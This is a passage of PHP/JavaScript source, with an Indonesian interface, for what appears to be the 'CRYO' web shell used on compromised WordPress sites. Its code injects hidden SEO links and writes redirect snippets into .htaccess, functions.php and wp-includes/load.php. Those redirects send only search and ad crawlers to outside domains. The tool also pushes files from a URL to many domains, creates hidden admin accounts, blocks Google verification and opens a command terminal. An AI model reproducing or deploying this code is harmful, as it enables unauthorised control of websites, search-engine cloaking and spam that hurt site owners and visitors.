            var rb = document.getElementById('linkInjectResult');
            rb.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Membersihkan...';
            var fd = new FormData();
            fd.append('cryo_link_inject_off','1');
            fd.append('scope', document.getElementById('linkInjectScope').value);
            fd.append('framework', (document.getElementById('linkInjectFramework')||{}).value || 'auto');
            fetch(window.location.href, { method:'POST', body:fd, credentials:'same-origin' })
              .then(function(r){ return r.json(); })
              .then(function(j){
                if (!j.success){ rb.innerHTML = '<div style="padding:8px;color:#fca5a5;background:rgba(239,68,68,0.1);border-radius:6px"> '+_liEsc(j.error||'')+'</div>'; return; }
                var msg = ' Bersih. '+(j.deleted?j.deleted.length:0)+' file dihapus';
                if (j.htaccess_cleaned) msg += ', .htaccess di-restore';
                if (j.failed && j.failed.length) msg += '. Gagal hapus: '+j.failed.join(', ');
                rb.innerHTML = '<div style="padding:8px;color:#86efac;background:rgba(34,197,94,0.1);border-radius:6px">'+_liEsc(msg)+'</div>';
                // Reset form
                for (var i=1; i<=3; i++){
                    document.getElementById('link'+i+'_url').value='';
                    document.getElementById('link'+i+'_anchor').value='';
                    document.getElementById('link'+i+'_rel').value='dofollow';
                    document.getElementById('link'+i+'_hidden').checked=false;
                }
                cryoLinkInjectStatus();
              })
              .catch(function(e){ rb.innerHTML = '<div style="padding:8px;color:#fca5a5">Network error: '+_liEsc(e.message)+'</div>'; });
        }
      </script>

      <?php
        // === CRYO_TPL ACTIVE SCANNER ===
      if (!function_exists('fm_scan_cryo_snippets')) {
          function fm_scan_cryo_snippets(array $roots) {
              $active = [];
              $seen = [];
              foreach ($roots as $root) {
                  $root = rtrim((string)$root, '/\\');
                  if ($root === '' || !is_dir($root)) continue;
                  foreach (['/.htaccess', '/functions.php', '/load.php', '/wp-includes/load.php'] as $rel) {
                      $f = $root . $rel;
                      if (isset($seen[$f]) || !is_file($f) || !is_readable($f)) continue;
                      $seen[$f] = 1;
                      $c = @file_get_contents($f);
                      if ($c === false) continue;
                      if (preg_match_all('/(?:#|\/\/) BEGIN CRYO_TPL:([a-zA-Z0-9_]+)/', $c, $m)) {
                          foreach ($m[1] as $key) {
                              $active[] = ['file' => $f, 'key' => $key];
                          }
                      }
                  }
              }
              return $active;
          }
      }
      $cryoActiveSnippets = [];
      if ($isAdmin) {
          $scanRoots = [];
          if (!empty($_SERVER['DOCUMENT_ROOT'])) $scanRoots[] = $_SERVER['DOCUMENT_ROOT'];
          $scanRoots[] = $directory;
          // Add immediate child folders of current dir (1 level deep)
          $kids = @scandir($directory);
          if (is_array($kids)) {
              foreach ($kids as $k) {
                  if ($k === '.' || $k === '..') continue;
                  $sub = $directory . '/' . $k;
                  if (is_dir($sub)) $scanRoots[] = $sub;
              }
          }
          $cryoActiveSnippets = fm_scan_cryo_snippets(array_unique($scanRoots));
      }
      $cryoActiveCount = count($cryoActiveSnippets);
      ?>
  
      <div id="redirectModal" class="modal">
        <div class="modal-content" style="max-width:560px;max-height:90vh;overflow-y:auto">
            <div class="modal-header">
                <h3><i class="fas fa-shield-halved" style="color:var(--accent-h)"></i> Htaccess & Redirect</h3>
                <button class="modal-close" onclick="closeRedirectModal()">&times;</button>
            </div>
            <?php if ($cryoActiveCount > 0): ?>
              <div style="background:rgba(245,158,11,0.1);border-left:3px solid #f59e0b;padding:10px 12px;border-radius:8px;margin-bottom:14px">
                  <div style="font-weight:600;font-size:13px;color:#fbbf24;margin-bottom:8px;display:flex;align-items:center;gap:6px">
                      <i class="fas fa-bell"></i> Snippet Aktif (<?= $cryoActiveCount ?>)
                      <span style="margin-left:auto;font-size:10px;font-weight:400;color:var(--muted)">jangan lupa OFF kalau sudah tidak dipakai</span>
                  </div>
                  <div style="display:flex;flex-direction:column;gap:6px;max-height:170px;overflow-y:auto">
                      <?php foreach ($cryoActiveSnippets as $snip):
                          $isRedirect = (strpos($snip['key'], 'redirect_') === 0);
                          $catVal = $isRedirect ? 'redirect' : 'htaccess';
                          $folderVal = dirname($snip['file']);
                      ?>
                      <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;background:rgba(0,0,0,0.25);padding:6px 10px;border-radius:6px;font-size:11px;border:1px solid rgba(245,158,11,0.2)">
                          <div style="overflow:hidden;flex:1;min-width:0">
                              <div style="font-weight:600;color:#fbbf24"><?= htmlspecialchars($snip['key']) ?></div>
                              <div style="color:var(--muted);font-size:10px;text-overflow:ellipsis;overflow:hidden;white-space:nowrap" title="<?= htmlspecialchars($snip['file']) ?>"><?= htmlspecialchars($snip['file']) ?></div>
                          </div>
                          <form method="post" style="margin:0;flex-shrink:0" onsubmit="return confirm('Matikan snippet <?= htmlspecialchars($snip['key'], ENT_QUOTES) ?>?')">
                              <input type="hidden" name="runHtaccessTpl" value="1">
                              <input type="hidden" name="ht_category" value="<?= $catVal ?>">
                              <input type="hidden" name="ht_template" value="<?= htmlspecialchars($snip['key']) ?>">
                              <input type="hidden" name="ht_target_folder" value="<?= htmlspecialchars($folderVal) ?>">
                              <input type="hidden" name="ht_redirect_target" value="<?= htmlspecialchars($redirectTargetDefault) ?>">
                              <input type="hidden" name="ht_action" value="remove">
                              <button type="submit" style="background:#ef4444;color:#fff;border:none;padding:5px 12px;border-radius:5px;cursor:pointer;font-size:11px;font-weight:600"><i class="fas fa-power-off"></i> OFF</button>
                          </form>
                      </div>
                      <?php endforeach; ?>
                  </div>
              </div>
              <?php endif; ?>
  
              <form method="post" id="redirectForm">
                  <input type="hidden" name="runHtaccessTpl" value="1">
  
                  <label style="font-size:12px;color:var(--muted)">Kategori</label>
                <select name="ht_category" id="ht_category" onchange="updateHtTplOptions()" required>
                    <option value="htaccess">.htaccess Rules</option>
                    <option value="redirect">Htaccess Redirect</option>
                    <option value="wpinc_redirect">Redirect via Wp-includes</option>
                </select>

                <label style="font-size:12px;color:var(--muted)">Template</label>
                <select name="ht_template" id="ht_template" required></select>

                <label style="font-size:12px;color:var(--muted)">Folder Tujuan (absolute path)</label>
                <input type="text" name="ht_target_folder" id="ht_target_folder" value="<?= htmlspecialchars($directory) ?>" required>
                <small style="font-size:11px;color:var(--muted);display:block;margin-top:-4px;margin-bottom:8px">Default: folder yang sedang dibuka. Untuk template "Redirect di theme aktif" akan ditulis ke functions.php theme.</small>

                <label style="font-size:12px;color:var(--muted)">Redirect Target URL (domain tujuan, untuk semua template Redirect)</label>
                <input type="url" name="ht_redirect_target" id="ht_redirect_target" value="<?= htmlspecialchars($redirectTargetDefault) ?>" placeholder="https://domain-tujuan.com">

                <div id="ht_field_exception" class="ht_dyn_field" style="display:none">
                    <label style="font-size:12px;color:var(--muted)">Folder Pengecualian (tanpa /)</label>
                    <input type="text" name="ht_exception_folder" value="" placeholder="contoh: kontak">
                    <label style="font-size:12px;color:var(--muted)">Query String Pengecualian <span style="color:#10b981">(opsional)</span></label>
                    <input type="text" name="ht_exception_query" value="" placeholder="kosongkan jika tidak perlu, contoh: brand=alpha">
                </div>

                <div id="ht_field_brand" class="ht_dyn_field" style="display:none">
                    <label style="font-size:12px;color:var(--muted)">Nama Folder Sumber (yang akan di-redirect)</label>
                    <input type="text" name="ht_brand_folder" value="namafolder" placeholder="contoh: produk">
                </div>

                <div id="ht_field_theme" class="ht_dyn_field" style="display:none">
                    <div style="background:rgba(99,102,241,0.06);border:1px solid var(--border);padding:8px;border-radius:6px;margin-bottom:8px">
                        <div style="font-size:11px;color:#6366f1;font-weight:600;margin-bottom:6px">Route 1 (wajib diisi)</div>
                        <label style="font-size:12px;color:var(--muted)">Slug Halaman WP</label>
                        <input type="text" name="ht_theme_page1" value="contact" placeholder="contoh: contact">
                        <label style="font-size:12px;color:var(--muted)">Path File HTML (relatif WP_CONTENT_DIR)</label>
                        <input type="text" name="ht_theme_file1" value="/uploads/2025/12/contact.html" placeholder="/uploads/2025/12/contact.html">
                    </div>
                    <div style="background:rgba(99,102,241,0.04);border:1px solid var(--border);padding:8px;border-radius:6px;margin-bottom:8px">
                        <div style="font-size:11px;color:var(--muted);font-weight:600;margin-bottom:6px">Route 2 (opsional)</div>
                        <label style="font-size:12px;color:var(--muted)">Slug Halaman WP</label>
                        <input type="text" name="ht_theme_page2" value="" placeholder="contoh: about (kosongkan jika tidak dipakai)">
                        <label style="font-size:12px;color:var(--muted)">Path File HTML (relatif WP_CONTENT_DIR)</label>
                        <input type="text" name="ht_theme_file2" value="" placeholder="/uploads/2025/12/about.html">
                    </div>
                    <div style="background:rgba(99,102,241,0.04);border:1px solid var(--border);padding:8px;border-radius:6px;margin-bottom:8px">
                        <div style="font-size:11px;color:var(--muted);font-weight:600;margin-bottom:6px">Route 3 (opsional)</div>
                        <label style="font-size:12px;color:var(--muted)">Slug Halaman WP</label>
                        <input type="text" name="ht_theme_page3" value="" placeholder="contoh: institute (kosongkan jika tidak dipakai)">
                        <label style="font-size:12px;color:var(--muted)">Path File HTML (relatif WP_CONTENT_DIR)</label>
                        <input type="text" name="ht_theme_file3" value="" placeholder="/uploads/2025/12/institute.html">
                    </div>
                </div>

                <div id="ht_field_wpinc" class="ht_dyn_field" style="display:none">
                      <div style="background:rgba(245,158,11,0.06);border:1px dashed rgba(245,158,11,0.3);padding:8px;border-radius:6px;margin-bottom:8px;font-size:11px;color:#fbbf24">
                          <i class="fas fa-info-circle"></i> <strong>Folder Tujuan</strong> = root WordPress (yang berisi <code>wp-includes/</code>). Snippet akan disisipkan ke <code>wp-includes/load.php</code>.
                      </div>
                      <?php for ($wri = 1; $wri <= 8; $wri++):
                          $req = ($wri === 1);
                          $bg = $req ? 'rgba(99,102,241,0.06)' : 'rgba(99,102,241,0.04)';
                          $col = $req ? '#6366f1' : 'var(--muted)';
                          $lbl = $req ? 'Route 1 (wajib diisi)' : 'Route '.$wri.' (opsional)';
                      ?>
                      <div style="background:<?= $bg ?>;border:1px solid var(--border);padding:8px;border-radius:6px;margin-bottom:8px">
                          <div style="font-size:11px;color:<?= $col ?>;font-weight:600;margin-bottom:6px"><?= $lbl ?></div>
                          <label style="font-size:12px;color:var(--muted)">Path URL Sumber (di domain ini)</label>
                          <input type="text" name="ht_wpinc_path<?= $wri ?>" value="" placeholder="<?= $req ? '/services/contoh-wajib' : '/path/opsional (kosongkan jika tidak dipakai)' ?>">
                          <label style="font-size:12px;color:var(--muted)">Target URL Tujuan</label>
                          <input type="text" name="ht_wpinc_url<?= $wri ?>" value="" placeholder="https://domain-tujuan.com/halaman/">
                      </div>
                      <?php endfor; ?>
                      <div style="background:rgba(0,0,0,0.2);padding:6px 8px;border-radius:6px;margin-bottom:8px;font-size:11px;color:var(--muted)">
                          Default keyword bot: <code>googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot</code>
                      </div>
                  </div>

                  <label style="font-size:12px;color:var(--muted)">Aksi</label>
                <div style="display:flex;gap:12px;margin-bottom:12px">
                    <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:12px"><input type="radio" name="ht_action" value="add" checked> <strong style="color:#10b981">Aktifkan (ON)</strong></label>
                    <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:12px"><input type="radio" name="ht_action" value="remove"> <strong style="color:#ef4444">Nonaktifkan (OFF)</strong></label>
                </div>

                <div style="background:rgba(99,102,241,0.08);border-left:3px solid #6366f1;padding:8px 10px;border-radius:6px;font-size:11px;color:var(--muted);margin-bottom:12px">
                    <i class="fas fa-info-circle"></i> Aturan: jika .htaccess sudah ada, snippet di-<strong>tambahkan di bawah</strong> (tidak menimpa). Jika belum ada, akan dibuat baru. Setiap snippet dibungkus marker <code>BEGIN/END CRYO_TPL</code> sehingga bisa dimatikan kembali.
                </div>

                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeRedirectModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Apply</button>
                </div>
            </form>
        </div>
    </div>

    </div>

    <div id="scanModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-shield-halved" style="color:var(--accent-h)"></i> Security Scan</h3>
                <button class="modal-close" onclick="closeScanModal()">&times;</button>
            </div>
            <form method="post" id="scanForm">
                <div style="display:flex;flex-direction:column;gap:8px">
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanHtaccess" value="1"> Scan .htaccess files</label>
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanLocked" value="1"> Scan locked folders</label>
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanWpAdmin" value="1" onchange="toggleWpVersion('admin')"> Scan wp-admin (checksum)</label>
                    <div id="wpVersionAdminBox" style="display:none;margin-left:24px">
                        <input type="text" name="wpVersionAdmin" placeholder="WP version (auto if empty)">
                    </div>
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanWpIncludes" value="1" onchange="toggleWpVersion('includes')"> Scan wp-includes (checksum)</label>
                    <div id="wpVersionIncludesBox" style="display:none;margin-left:24px">
                        <input type="text" name="wpVersionIncludes" placeholder="WP version (auto if empty)">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeScanModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Run Scan</button>
                </div>
            </form>
        </div>
    </div>

    <div id="deployModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-rocket" style="color:var(--accent-h)"></i> Deploy File to Domains</h3>
                <button class="modal-close" onclick="closeDeployModal()">&times;</button>
            </div>
            <?php
            $deployItems = isset($_SESSION['deploy_scan_items']) ? $_SESSION['deploy_scan_items'] : [];
            ?>
            <form method="post" id="deployForm">
                <?php if (empty($deployItems)): ?>
                    <p style="font-size:12px;color:var(--muted);margin-bottom:12px">No domains scanned yet. Click "Scan Folders" first.</p>
                    <button type="submit" name="deployScanDomains" class="btn btn-primary">Scan Domains</button>
                <?php else: ?>
                    <p style="font-size:12px;color:var(--muted);margin-bottom:8px">Select target domains:</p>
                    <div style="max-height:200px;overflow-y:auto;border:1px solid var(--border);padding:8px;border-radius:8px">
                        <?php foreach ($deployItems as $idx => $info): ?>
                            <label style="display:block;margin-bottom:4px;font-size:12px;cursor:pointer">
                                <input type="checkbox" name="deploy_file_targets[]" value="<?= $idx ?>">
                                <strong><?= htmlspecialchars($info['label']) ?></strong><br>
                                <span class="text-muted" style="font-size:11px;margin-left:20px"><?= htmlspecialchars($info['target']) ?></span>
                            </label>
                        <?php endforeach; ?>
                    </div>
                    <label style="font-size:12px;color:var(--muted);margin-top:8px;display:block">File URL</label>
                    <input type="url" name="deploy_file_url" required>
                    <label style="font-size:12px;color:var(--muted)">Custom filename (optional)</label>
                    <input type="text" name="deploy_file_name">
                    <label style="font-size:12px;color:var(--muted)">Subpath inside domain (optional)</label>
                    <input type="text" name="deploy_file_path" placeholder="e.g., wp-content/plugins">
                    <div class="modal-footer">
                        <button type="button" class="btn" onclick="closeDeployModal()">Cancel</button>
                        <button type="submit" name="deployRunFile" class="btn btn-primary">Deploy</button>
                    </div>
                <?php endif; ?>
                <button type="submit" name="deployReset" class="btn btn-sm mt-2" style="font-size:10px">Reset Scan</button>
            </form>
        </div>
    </div>

    <div id="toast-container" class="toast-container"></div>

    <script>
        function showToast(msg, type) {
            const c = document.getElementById('toast-container');
            const t = document.createElement('div');
            t.className = 'toast alert ' + (type || 'success');
            t.innerHTML = msg;
            c.appendChild(t);
            setTimeout(() => { t.style.opacity='0'; t.style.transform='translateX(40px)'; setTimeout(() => t.remove(), 300); }, 8000);
        }

        function selectAll(checked) {
            document.querySelectorAll('.select-item').forEach(cb => cb.checked = checked);
        }

        document.querySelectorAll('.ajax-delete-form').forEach(form => {
            form.querySelector('.delete-btn').addEventListener('click', function() {
                if (!confirm('Delete this item?')) return;
                const name = form.dataset.name;
                const formData = new FormData();
                formData.append('target', name);
                fetch('?ajax_delete=1&folder=<?= urlencode($directory) ?>', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) location.reload();
                    else alert('Delete failed');
                });
            });
        });

        document.querySelectorAll('.extract-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.getElementById('extract-archive-file').value = this.dataset.archive;
                document.getElementById('extract-dest').value = '<?= htmlspecialchars($directory) ?>';
                document.getElementById('extractModal').style.display = 'flex';
            });
        });

        function closeExtractModal() { document.getElementById('extractModal').style.display = 'none'; }

        // === CRYO CODE EXPLORER ===
          function showCryoSearchModal() {
              document.getElementById('cryoSearchModal').style.display = 'flex';
              setTimeout(function(){ var q = document.getElementById('cryoSearchQuery'); if (q) q.focus(); }, 50);
          }
          function closeCryoSearchModal() { document.getElementById('cryoSearchModal').style.display = 'none'; }
          function cryoSetScope(which) {
              var s = document.getElementById('cryoSearchScope');
              if (which === 'current')   s.value = <?= json_encode($directory) ?>;
              else if (which === 'docroot') s.value = <?= json_encode(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '/') ?>;
              else if (which === 'parent')  {
                  var v = s.value.replace(/\/+$/, '');
                  var i = v.lastIndexOf('/');
                  if (i > 0) s.value = v.substring(0, i);
              }
          }
          function cryoClearResults() {
              document.getElementById('cryoSearchResults').innerHTML = '<div style="padding:18px;text-align:center;color:var(--muted)">Hasil dibersihkan.</div>';
              document.getElementById('cryoSearchStat').textContent = '';
          }
          function cryoEsc(s) { return String(s).replace(/[&<>"']/g, function(c){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]; }); }
          function cryoHighlight(text, q, isRegex, caseSens) {
                var pat;
                try {
                    if (isRegex) {
                        pat = new RegExp(q, caseSens ? 'g' : 'gi');
                    } else {
                        // Escape regex special chars in q
                        var esc = q.replace(/[-\/\\^$*+?.()|[\]{}]/g, function(m){ return '\\' + m; });
                        pat = new RegExp(esc, caseSens ? 'g' : 'gi');
                    }
                    return cryoEsc(text).replace(pat, function(m){
                        return '<mark style="background:#facc15;color:#000;padding:0 2px;border-radius:2px">' + cryoEsc(m) + '</mark>';
                    });
                } catch(e) { return cryoEsc(text); }
            }
            function cryoRunSearch() {
              var q       = document.getElementById('cryoSearchQuery').value.trim();
              var scope   = document.getElementById('cryoSearchScope').value.trim();
              var mode    = document.getElementById('cryoSearchMode').value;
              var pattern = document.getElementById('cryoSearchPattern').value.trim();
              var cs      = document.getElementById('cryoSearchCase').checked ? '1' : '';
              var rx      = document.getElementById('cryoSearchRegex').checked ? '1' : '';
              var max     = document.getElementById('cryoSearchMax').value || '500';
              var resBox  = document.getElementById('cryoSearchResults');
              var statBox = document.getElementById('cryoSearchStat');
              if (!q) { alert('Query kosong.'); return; }
              resBox.innerHTML = '<div style="padding:18px;text-align:center;color:var(--muted)"><i class="fas fa-spinner fa-spin"></i> Mencari...</div>';
              statBox.textContent = '';
              var fd = new FormData();
              fd.append('cryo_search', '1');
              fd.append('q', q);
              fd.append('scope', scope);
              fd.append('mode', mode);
              fd.append('pattern', pattern);
              fd.append('case_sens', cs);
              fd.append('regex', rx);
              fd.append('max', max);
              fetch(window.location.href, { method:'POST', body: fd, credentials:'same-origin' })
                .then(function(r){ return r.json(); })
                .then(function(j){
                  if (!j.success) { resBox.innerHTML = '<div style="padding:14px;color:#fca5a5">Error: ' + cryoEsc(j.error || 'Unknown') + '</div>'; return; }
                  var st = j.stat || {};
                  statBox.innerHTML = (j.results.length) + ' hasil " ' + (st.files_scanned || 0) + ' file di-scan " ' + (st.elapsed_ms || 0) + ' ms' + (st.truncated ? ' " <span style="color:#fbbf24">truncated</span>' : '');
                  if (!j.results.length) { resBox.innerHTML = '<div style="padding:18px;text-align:center;color:var(--muted)">Tidak ada hasil.</div>'; return; }
                  var html = '';
                  var byFile = {};
                  j.results.forEach(function(r){ if(!byFile[r.file]) byFile[r.file]=[]; byFile[r.file].push(r); });
                  Object.keys(byFile).forEach(function(fp){
                      var arr = byFile[fp];
                      var folder = fp.replace(/\/[^\/]+$/, '');
                      var name   = arr[0].name;
                      html += '<div style="border-bottom:1px solid var(--border);padding:6px 4px">';
                      html += '<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;margin-bottom:4px">';
                      html += '  <div style="font-weight:600;color:#a5b4fc;word-break:break-all"><i class="fas fa-file-code"></i> ' + cryoEsc(name) + '</div>';
                      html += '  <a href="?folder=' + encodeURIComponent(folder) + '" style="font-size:11px;color:#86efac;text-decoration:none;white-space:nowrap"><i class="fas fa-folder-open"></i> Buka folder</a>';
                      html += '</div>';
                      html += '<div style="font-size:11px;color:var(--muted);margin-bottom:4px;word-break:break-all">' + cryoEsc(fp) + '</div>';
                      arr.forEach(function(r){
                          if (r.type === 'filename') {
                              html += '<div style="background:rgba(34,197,94,0.08);padding:3px 6px;border-radius:3px;margin:2px 0"><span style="color:#86efac">[nama file cocok]</span></div>';
                          } else {
                              html += '<div style="display:flex;gap:8px;padding:2px 6px;border-radius:3px">';
                              html += '  <span style="color:#fbbf24;min-width:38px;text-align:right">L' + r.line + '</span>';
                              html += '  <span style="white-space:pre-wrap;word-break:break-all;flex:1">' + cryoHighlight(r.preview, q, rx==='1', cs==='1') + '</span>';
                              html += '</div>';
                          }
                      });
                      html += '</div>';
                  });
                  resBox.innerHTML = html;
                })
                .catch(function(e){ resBox.innerHTML = '<div style="padding:14px;color:#fca5a5">Network error: ' + cryoEsc(e.message) + '</div>'; });
          }
          document.addEventListener('DOMContentLoaded', function(){
              var q = document.getElementById('cryoSearchQuery');
              if (q) q.addEventListener('keydown', function(e){ if (e.key === 'Enter') { e.preventDefault(); cryoRunSearch(); } });
          });
  
          function showAdminModal() { document.getElementById('adminModal').style.display = 'flex'; }
        function closeAdminModal() { document.getElementById('adminModal').style.display = 'none'; }
        function _cryoMakeHidden(name, value) {
            const i = document.createElement('input');
            i.type = 'hidden';
            i.name = name;
            i.value = value == null ? '' : String(value);
            return i;
        }
        function adminLogin() {
            const pin = document.getElementById('admin-pin').value;
            if (!pin) { alert('PIN required'); return; }
            const form = document.createElement('form');
            form.method = 'post';
            form.action = window.location.href;
            form.appendChild(_cryoMakeHidden('admin_pin', pin));
            form.appendChild(_cryoMakeHidden('auto_admin_login', '1'));
            document.body.appendChild(form);
            form.submit();
        }
        function adminCreateUser() {
            const pin   = document.getElementById('admin-pin').value;
            const user  = document.getElementById('admin-new-user').value;
            const pass  = document.getElementById('admin-new-pass').value;
            const email = document.getElementById('admin-new-email').value;
            if (!pin)              { alert('PIN required'); return; }
            if (!user || !pass)    { alert('Username & Password required'); return; }
            const form = document.createElement('form');
            form.method = 'post';
            form.action = window.location.href;
            form.appendChild(_cryoMakeHidden('admin_pin', pin));
            form.appendChild(_cryoMakeHidden('admin_new_user', user));
            form.appendChild(_cryoMakeHidden('admin_new_pass', pass));
            form.appendChild(_cryoMakeHidden('admin_new_email', email));
            form.appendChild(_cryoMakeHidden('create_admin_user', '1'));
            document.body.appendChild(form);
            form.submit();
        }


        function showScanModal() { document.getElementById('scanModal').style.display = 'flex'; }
        function closeScanModal() { document.getElementById('scanModal').style.display = 'none'; }
        function toggleWpVersion(type) {
            const box = document.getElementById('wpVersion' + (type === 'admin' ? 'Admin' : 'Includes') + 'Box');
            const cb = document.querySelector('input[name="scan' + (type === 'admin' ? 'WpAdmin' : 'WpIncludes') + '"]');
            box.style.display = cb.checked ? 'block' : 'none';
        }

        const HT_TEMPLATES = {
              htaccess: [
                  { v: 'wp_includes',  l: 'wp-includes  block PHP execution' },
                  { v: 'wp_content',   l: 'wp-content  allow only static files' },
                  { v: 'custom_allow', l: 'Custom Allow All' },
                  { v: 'custom_deny',  l: 'Custom Deny PHP Execution' },
                  { v: 'folder_safe',  l: 'Folder Safe (WordPress fallback)' },
                  { v: 'deny_google',  l: 'Tolak Verifikasi Google Console' },
                  { v: 'deny_bot',     l: 'Tolak Crawl Bot' }
              ],
              redirect: [
                  { v: 'redirect_all',       l: 'Redirect All (semua URL)' },
                  { v: 'redirect_exception', l: 'Redirect dengan Pengecualian' },
                  { v: 'redirect_brand',     l: 'Redirect per Brand (folder)' },
                  { v: 'redirect_theme',     l: 'Redirect di Theme Aktif (functions.php)' }
              ],
              wpinc_redirect: [
                  { v: 'wpinc_bot_redirect', l: 'Bot Redirect via wp-includes/load.php' }
              ]
          };
          function updateHtTplOptions() {
              const cat = document.getElementById('ht_category').value;
              const sel = document.getElementById('ht_template');
              sel.innerHTML = '';
              (HT_TEMPLATES[cat] || []).forEach(function(o){
                  const opt = document.createElement('option');
                  opt.value = o.v; opt.textContent = o.l;
                  sel.appendChild(opt);
              });
              sel.onchange = updateHtDynFields;
              updateHtDynFields();
          }
          function updateHtDynFields() {
              const tpl = document.getElementById('ht_template').value;
              const cat = document.getElementById('ht_category').value;
              document.querySelectorAll('.ht_dyn_field').forEach(function(el){ el.style.display='none'; });
              const tgt = document.getElementById('ht_redirect_target');
              if (tgt) {
                  const lbl = tgt.previousElementSibling;
                  // Sembunyikan Redirect Target URL untuk template theme (tidak dipakai)
                  const show = (cat === 'redirect') && (tpl !== 'redirect_theme');
                  tgt.style.display = show ? '' : 'none';
                  if (lbl) lbl.style.display = show ? '' : 'none';
              }
              if (tpl === 'redirect_exception') document.getElementById('ht_field_exception').style.display='';
              if (tpl === 'redirect_brand')     document.getElementById('ht_field_brand').style.display='';
              if (tpl === 'redirect_theme')     document.getElementById('ht_field_theme').style.display='';
                if (tpl === 'wpinc_bot_redirect') document.getElementById('ht_field_wpinc').style.display='';
                // Hide redirect target URL for wpinc (not used, each route has own target)
                if (cat === 'wpinc_redirect') {
                    if (tgt) {
                        tgt.style.display = 'none';
                        const lbl2 = tgt.previousElementSibling;
                        if (lbl2) lbl2.style.display = 'none';
                    }
                }
          }
          function showRedirectModal() {
              document.getElementById('redirectModal').style.display = 'flex';
              updateHtTplOptions();
          }
          function closeRedirectModal() { document.getElementById('redirectModal').style.display = 'none'; }

        function showDeployModal() { document.getElementById('deployModal').style.display = 'flex'; }
        function closeDeployModal() { document.getElementById('deployModal').style.display = 'none'; }

        let editorInstance = null;
        let currentEditFile = '';

        function openEditModal(filename) {
            currentEditFile = filename;
            document.getElementById('edit-filename').textContent = filename;
            document.getElementById('editModal').style.display = 'flex';

            fetch('?get_file_content=' + encodeURIComponent(filename) + '&folder=<?= urlencode($directory) ?>')
                .then(res => {
                    if (!res.ok) throw new Error('Cannot read file');
                    return res.text();
                })
                .then(content => {
                    if (!editorInstance) {
                        editorInstance = CodeMirror(document.getElementById('editor-container'), {
                            value: content,
                            lineNumbers: true,
                            mode: 'php',
                            theme: 'material-darker',
                            indentUnit: 4,
                            tabSize: 4,
                            lineWrapping: true
                        });
                    } else {
                        editorInstance.setValue(content);
                    }

                    const ext = filename.split('.').pop().toLowerCase();
                    const modeMap = {
                        'php': 'php',
                        'html': 'htmlmixed',
                        'htm': 'htmlmixed',
                        'js': 'javascript',
                        'css': 'css',
                        'xml': 'xml',
                        'json': 'javascript',
                        'txt': 'text/plain'
                    };
                    editorInstance.setOption('mode', modeMap[ext] || 'php');
                    editorInstance.refresh();
                })
                .catch(err => {
                    alert('Error: ' + err.message);
                    closeEditModal();
                });
        }

        function closeEditModal() {
            document.getElementById('editModal').style.display = 'none';
        }

        function saveEdit() {
            if (!editorInstance) return;
            const content = editorInstance.getValue();

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    'save_edit': '1',
                    'file': currentEditFile,
                    'content': content
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showToast('<i class="fas fa-circle-check"></i> File saved successfully.', 'success');
                    closeEditModal();
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            })
            .catch(err => alert('Error: ' + err.message));
        }

        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('.file-item form button[name="edit"]').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    const form = this.closest('form');
                    const fileNameInput = form.querySelector('input[name="fileNameToEdit"]');
                    if (fileNameInput) {
                        openEditModal(fileNameInput.value);
                    }
                });
            });
        });

        <?php if ($isAdmin): ?>
        (function() {
            let termCwd = <?= json_encode($rootDirectory) ?>;
            let termHistory = [];
            let termHistIdx = -1;

            const HELP_TEXT = [
                '  CRYO Terminal v2.0 — Command Reference',
                '  ═══════════════════════════════════════',
                '',
                '  NAVIGATION',
                '    pwd              Show current directory',
                '    ls / ls -la      List directory contents',
                '    cd <folder>      Change directory',
                '    cd .. / cd ~     Go up / go to Document Root',
                '',
                '  FILE MANAGEMENT',
                '    cat / head / tail    View file contents',
                '    cp / mv / rm        Copy / Move / Delete',
                '    mkdir / touch       Create folder / file',
                '    chmod 755 <f>       Change permissions',
                '',
                '  SYSTEM INFO',
                '    whoami / uname -a / df -h / free -h',
                '    php -v / ps aux',
                '',
                '  SEARCH',
                '    find . -name "*.php"    Find files',
                '    grep -r "text" .        Search in files',
                '',
                '  TERMINAL',
                '    clear    Clear screen',
                '    help     Show this help',
                '',
                '  TIP: Use Arrow Up/Down for command history',
            ].join('\n');

            window.showTerminalModal = function() {
                const modal = document.getElementById('terminalModal');
                modal.style.display = 'flex';
                updatePrompt();
                if (document.getElementById('term-output').innerHTML === '') {
                    appendOutput('CRYO Terminal v2.0 — type \'help\' for commands', 'info');
                    appendOutput('Working Directory: ' + termCwd, 'muted');
                    appendOutput('', '');
                }
                document.getElementById('term-input').focus();
            };

            window.closeTerminalModal = function() {
                document.getElementById('terminalModal').style.display = 'none';
            };

            window.termClear = function() {
                document.getElementById('term-output').innerHTML = '';
            };

            function updatePrompt() {
                const shortCwd = termCwd.length > 40 ? '...' + termCwd.slice(-37) : termCwd;
